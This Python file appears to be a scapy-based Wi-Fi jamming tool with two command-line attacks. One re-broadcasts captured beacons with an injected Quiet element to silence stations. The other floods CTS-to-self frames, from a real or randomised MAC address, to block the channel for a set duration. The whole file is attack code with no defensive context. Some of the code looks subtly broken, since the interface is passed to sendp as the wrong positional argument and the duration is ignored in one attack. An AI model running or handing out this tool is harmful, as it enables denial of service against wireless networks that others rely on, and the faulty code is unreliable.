import argparse
import time
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Elt
from scapy.all import sendp, sniff, RandMAC, get_if_hwaddr
from dpkt.ieee80211 import CTL_TYPE, C_CTS, MGMT_TYPE, M_BEACON


def quiet_attack(interface, attack_duration, ssids=None):
    def callback(packet):
        if packet.haslayer(Dot11):
            if packet.type == MGMT_TYPE and packet.subtype == M_BEACON:
                quiet_payload = Dot11Elt(ID=40, info="\x00\x00\x00\x01\x00\x00")
                new_payload = RadioTap()/packet.getlayer(Dot11)/quiet_payload
                sendp(new_payload, interface)
    sniff(iface=interface, prn=callback, filter="type mgt subtype beacon")


def cts_self_attack(interface, attack_duration, mac_address=None, random_mac=False, send_interval=0.1):
    if random_mac:
        mac_address = RandMAC()
    elif mac_address is None:
        mac_address = get_if_hwaddr(interface)
    cts_packet = RadioTap()/Dot11(
        type=CTL_TYPE, subtype=C_CTS,
        ID=0xFF7F, addr1=mac_address, addr2=mac_address, addr3=mac_address
    )
    start_time = time.time()
    while (time.time() - start_time) < attack_duration:
        sendp(
            cts_packet, interface
        )
        time.sleep(send_interval)


def attach_quiet_attack(subparser: argparse.ArgumentParser):
    def subfunc(args):
        quiet_attack(args.interface, args.attack_duration)

    subparser.set_defaults(subfunc=subfunc)


def attach_cts_self_attack(subparser: argparse.ArgumentParser):
    def subfunc(args):
        cts_self_attack(
            args.interface,
            args.attack_duration,
            mac_address=args.mac_addr,
            random_mac=args.random_mac,
            send_interval=args.send_interval
        )

    subparser.set_defaults(subfunc=subfunc)
    subparser.add_argument("--random-mac", action="store_true")
    subparser.add_argument("-m", "--mac-addr", type=str, default=None, help="Set the MAC address to be used.")
    subparser.add_argument("-i", "--send-interval", type=float, default=0.1)


def attach_run_attacks(subparser: argparse.ArgumentParser):
    def func(args):
        args.subfunc(args)

    subparser.add_argument("interface", type=str, help="Wireless interface to use.")
    subparser.add_argument("-d", "--attack-duration", type=float, default=60.0, help="How long to run the attack for.")

    subparser.set_defaults(func=func)
    subsubparsers = subparser.add_subparsers(title="attack commands", dest="attack_command")
    subsubparsers.required = True
    attach_quiet_attack(subsubparsers.add_parser("quiet-attack"))
    attach_cts_self_attack(subsubparsers.add_parser("cts-self-attack"))

